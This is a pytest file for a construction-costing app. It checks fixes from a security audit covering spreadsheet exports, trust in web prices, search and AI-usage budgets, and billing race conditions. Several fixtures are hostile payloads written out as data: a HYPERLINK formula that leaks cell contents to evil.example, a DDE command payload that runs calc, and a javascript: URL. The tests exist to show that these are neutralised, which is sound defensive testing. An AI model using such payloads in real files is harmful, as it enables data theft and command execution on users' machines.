"""17 Nov 2026 audit of #314–#339, money and costing: a spreadsheet never holds a live formula
from a web page or a reply; a web page can't replace a known supplier's shared price, and only
prices Vula can sanity-check are kept from the web; one estimate can't become hundreds of paid
searches; a top-up can't be both paid and cancelled; an AI call is added to the meter in one step."""
import io
import json
from unittest.mock import AsyncMock, MagicMock

import openpyxl
import pytest

from core import llm_router
from tests.fake_supabase import FakeSupabase
from vula import ai_allowance, answer_sheet
from vula.commerce import buildups, estimate, estimate_sheet, service
from vula.integrations import metering
from vula.takeoff import market
from vula.takeoff.construction_rates_scraper import MaterialRate, RatesDatabase

T = "digg-demo"
EVIL = '=HYPERLINK("https://evil.example/?d="&A5,"Open source")'


def _formulas(data):
    wb = openpyxl.load_workbook(io.BytesIO(data))
    return [c.coordinate for ws in wb for row in ws.iter_rows() for c in row if c.data_type == "f"]


def test_a_downloaded_answer_never_holds_a_formula_from_its_text():
    table = f"| Supplier | Price |\n|---|---|\n| {EVIL} | R 100 |\n| @SUM(A1) | R 5 |\n"
    sources = f"\n\nSources:\n[1] {EVIL} — https://shop.example/x\n[2] Bad — javascript:alert(1)\n"
    data, _ = answer_sheet.workbook("Kelp", "Prices", table + sources)
    assert _formulas(data) == []
    data, _ = answer_sheet.workbook("Kelp", "Notes", f"Plain answer\n{EVIL}\n\nSources:\n[1] Page — https://a.example/")
    assert _formulas(data) == []


def test_a_sources_link_is_only_ever_a_web_link(monkeypatch):
    monkeypatch.setattr(answer_sheet, "sources", lambda text: [
        {"n": "1", "title": "Bad", "url": "javascript:alert(1)"},
        {"n": "2", "title": "Good", "url": "https://shop.example/x"}])
    data, _ = answer_sheet.workbook("Kelp", "Prices", "| A | B |\n|---|---|\n| x | 1 |\n")
    ws = openpyxl.load_workbook(io.BytesIO(data))["Sources"]
    assert ws["C5"].hyperlink is None and ws["C6"].hyperlink.target == "https://shop.example/x"


def test_an_estimates_unit_column_is_text():
    est = {"title": "Wall", "id": "e1", "created_at": "2026-11-17", "items": [{
        "item": "Wall", "quantity": "1", "unit": "m2", "status": "priced", "total_cents": 0, "lines": [{
            "component": "units", "label": "Bricks", "kind": "material", "per_unit": "1", "waste_pct": "0",
            "quantity": "1", "unit": "=cmd|'/c calc'!A1", "priced": False}]}],
        "totals": {}, "total_cents": 0, "unpriced": [], "exclusions": [], "counts": {}}
    try:
        data = estimate_sheet.workbook("Kelp", est)[0]
    except (KeyError, TypeError) as exc:  # the sheet's own required fields
        pytest.fail(f"estimate fixture shape: {exc!r}")
    ws = openpyxl.load_workbook(io.BytesIO(data))["Estimate"]
    units = [c for row in ws.iter_rows(min_col=7, max_col=7) for c in row if "cmd" in str(c.value or "")]
    assert units and all(c.data_type == "s" for c in units)


# ── shared market prices ─────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def _no_mirror(monkeypatch):
    monkeypatch.setattr("vula.durable.upsert", lambda *a, **k: True)
    monkeypatch.setattr("vula.durable.select", lambda *a, **k: [])


def _page(monkeypatch, url, text, rows):
    monkeypatch.setattr("vula.research._search", AsyncMock(return_value=[{"title": "x", "url": url}]))
    monkeypatch.setattr("vula.research.read_pages", AsyncMock(return_value=[{"title": "x", "url": url, "text": text}]))
    monkeypatch.setattr("vula.research._complete", AsyncMock(return_value=json.dumps(
        [{"label": label, "unit": unit, "low": p, "high": p, "notes": ""} for label, unit, p in rows])))


@pytest.mark.asyncio
async def test_a_web_page_cant_replace_a_known_suppliers_price(tmp_path, monkeypatch):
    db = RatesDatabase(db_path=tmp_path / "m.db")
    db.upsert(MaterialRate(key="ppc_surebuild_cement_50kg", label="PPC Surebuild Cement 50kg", unit="bag",
                           low=109.99, high=109.99, source="cashbuild.co.za", checked=True))
    _page(monkeypatch, "https://cheap-cement.example/x", "PPC Surebuild Cement 50kg R189.00",
          [("PPC Surebuild Cement 50kg", "bag", 189.00)])
    assert await market.research_price("Cement 50kg", "bag", db=db) == 1
    sources = sorted(r.get("source") for r in db.get_all() if "Cement" in (r.get("label") or ""))
    assert "cashbuild.co.za" in sources and len(sources) == 2       # kept beside it, not over it


@pytest.mark.asyncio
async def test_a_web_price_vula_cant_sanity_check_is_not_kept(tmp_path, monkeypatch):
    db = RatesDatabase(db_path=tmp_path / "m.db")
    _page(monkeypatch, "https://any.example/x", "Mystery Widget R1.00 each", [("Mystery Widget", "each", 1.00)])
    assert await market.research_price("mystery widget", "each", db=db) == 0
    assert db.get_all() == []


@pytest.mark.asyncio
async def test_price_searches_stop_when_the_requests_budget_is_used(tmp_path, monkeypatch):
    search = AsyncMock(return_value=[])
    monkeypatch.setattr("vula.research._search", search)
    monkeypatch.setattr("vula.research.read_pages", AsyncMock(return_value=[]))
    token = market.limit_web(2)
    try:
        for _ in range(5):
            await market.research_price("cement", "bag", db=RatesDatabase(db_path=tmp_path / "m.db"))
    finally:
        market.reset_web(token)
    assert search.await_count == 2


# ── one estimate, bounded ────────────────────────────────────────────────────

@pytest.fixture()
def db(monkeypatch):
    d = FakeSupabase({buildups.TABLE: [], buildups.LINES: [], estimate.TABLE: []})
    monkeypatch.setattr(service, "_client", lambda: d)
    monkeypatch.setattr("vula.commerce.price_book.rates", lambda *a, **k: [])
    monkeypatch.setattr("vula.takeoff.market.price_for", AsyncMock(return_value=None))
    monkeypatch.setattr("vula.api.qs.search_rates", lambda *a, **k: [])
    return d


@pytest.mark.asyncio
async def test_too_many_items_is_refused(db):
    with pytest.raises(estimate.EstimateError):
        await estimate.estimate(T, [{"item": f"wall {i}", "quantity": 1} for i in range(estimate.MAX_ITEMS + 1)], save=False)


@pytest.mark.asyncio
async def test_only_a_few_new_build_ups_are_researched_per_estimate(db, monkeypatch):
    research = AsyncMock(side_effect=buildups.BuildupError("no sources"))
    monkeypatch.setattr(buildups, "research", research)
    items = [{"item": f"thing {i}", "quantity": 1} for i in range(8)]
    est = await estimate.estimate(T, items, research=True, save=False)
    assert research.await_count == estimate.MAX_NEW_BUILDUPS
    assert sum("Not researched" in (i.get("message") or "") for i in est["items"]) == 8 - estimate.MAX_NEW_BUILDUPS


def test_costing_research_stops_when_the_ai_allowance_is_used():
    assert {"buildup_research", "rates_extract"} <= llm_router.CAP_HARD_TASKS


@pytest.mark.asyncio
async def test_the_costing_endpoints_have_an_hourly_limit(monkeypatch):
    from fastapi import HTTPException
    from vula import open_chat
    from vula.api import trade_costing
    monkeypatch.setattr("config.settings.research_per_hour", 2)
    open_chat.clear()
    trade_costing._research_allowed(T, "m:judy")
    trade_costing._research_allowed(T, "m:judy")
    with pytest.raises(HTTPException) as e:
        trade_costing._research_allowed(T, "m:judy")
    assert e.value.status_code == 429
    trade_costing._research_allowed(T, "m:sipho")          # per person
    open_chat.clear()


# ── top-ups and the meter ────────────────────────────────────────────────────

def test_a_cancelled_top_up_cant_then_be_marked_paid(monkeypatch):
    d = FakeSupabase({"vula_ai_credits": [{"id": "c1", "tenant_id": T, "kind": "topup", "amount_cents": 50000,
                                           "status": "requested"}]})
    monkeypatch.setattr(service, "_client", lambda: d)
    monkeypatch.setattr(ai_allowance, "_client", lambda: d, raising=False)
    real_select = d.table

    # the cancel lands between mark_paid's read and its write
    calls = {"n": 0}

    def table(name):
        t = real_select(name)
        if name == "vula_ai_credits":
            calls["n"] += 1
            if calls["n"] == 2:            # mark_paid's update
                d.rows["vula_ai_credits"][0]["status"] = "cancelled"
        return t
    monkeypatch.setattr(d, "table", table)
    assert ai_allowance.mark_paid("c1", by="master") is None
    assert d.rows["vula_ai_credits"][0]["status"] == "cancelled"


def test_an_ai_call_is_added_to_the_meter_in_one_step(monkeypatch):
    db = MagicMock()
    monkeypatch.setattr(metering, "_client", lambda: db)
    monkeypatch.setitem(metering._ATOMIC, "ok", True)
    monkeypatch.setattr(metering, "_after_spend", lambda t: None)
    metering.record_llm(T, "openrouter/anthropic/claude-sonnet-5", 1000, 200, cost_usd=0.01)
    name, args = db.rpc.call_args[0]
    assert name == "vula_ai_usage_add"
    assert (args["p_tenant_id"], args["p_model"], args["p_prompt_tokens"], args["p_cost_usd"]) == \
        (T, "anthropic/claude-sonnet-5", 1000, 0.01)
    assert not db.table.called                     # no read-add-write


def test_before_the_migration_the_meter_still_counts(monkeypatch):
    d = FakeSupabase({"vula_ai_usage": []})
    d.rpc = MagicMock(side_effect=Exception("Could not find the function public.vula_ai_usage_add (PGRST202)"))
    monkeypatch.setattr(metering, "_client", lambda: d)
    monkeypatch.setitem(metering._ATOMIC, "ok", True)
    monkeypatch.setattr(metering, "_after_spend", lambda t: None)
    metering.record_llm(T, "openrouter/anthropic/claude-sonnet-5", 10, 1, cost_usd=0.5)
    metering.record_llm(T, "openrouter/anthropic/claude-sonnet-5", 10, 1, cost_usd=0.5)
    assert d.rows["vula_ai_usage"][0]["calls"] == 2 and metering._ATOMIC["ok"] is False
